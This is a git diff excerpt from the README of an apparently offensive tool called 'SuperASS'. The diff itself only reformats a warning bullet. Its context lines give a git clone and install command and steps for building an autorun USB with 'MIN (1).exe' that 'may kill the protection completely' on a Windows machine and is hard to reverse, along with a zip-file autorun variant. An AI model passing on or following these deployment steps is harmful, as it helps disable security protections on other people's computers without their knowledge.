@@ -48,7 +48,7 @@ git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x instal
 4. After you run the autorun program, choose the file MIN (1).exe & Then choose the USB disk & click create
 5. Now copy all the contents of the SuperASS file to the USB and then remove it, but beware not to put it again on your device, it may kill the protection completely and make it difficult to restore it, except by upgrading to the new versions of Windows such as the Insider version
 
-* - Notice : When you use USB Autorun Creator, all USB contents will be deleted, be careful!
+- Notice : When you use USB Autorun Creator, all USB contents will be deleted, be careful!
 
 ## [+]  Use SuperASS In Zip File AutoRun :
 
